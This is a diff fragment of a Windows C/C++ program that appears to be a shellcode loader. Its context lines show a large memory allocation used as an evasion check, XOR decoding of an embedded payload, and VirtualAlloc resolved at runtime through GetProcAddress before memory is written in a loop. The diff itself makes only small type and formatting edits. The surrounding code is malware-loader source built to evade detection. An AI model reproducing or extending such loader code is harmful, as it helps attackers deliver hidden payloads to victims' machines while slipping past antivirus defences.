@@ -107,7 +107,7 @@ int main(int argc, char* argv[])
   char *mem{(char *) malloc(100000000)};
   if (mem != NULL) 
   {
-  	memset(mem, 00, 100000000);
+  	memset(mem, 0x0, 100000000);
     free(mem);
 
 	  XOR((char *) payload, sizeof(payload), key, sizeof(key));
@@ -122,7 +122,7 @@ int main(int argc, char* argv[])
 	  printf("1 %s\n", payload);
 	  
 	  pMVA = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc"); 
-	  VOID* mem = pMVA(0, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
+	  PVOID mem = pMVA(0, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
 	  DWORD_PTR hptr = (DWORD_PTR)mem;
 	  
 	  for (int i{0}; i < loops; i++) {
@@ -154,5 +154,4 @@ int main(int argc, char* argv[])
 	}else {
     return EXIT_FAILURE;
   }
-
 }
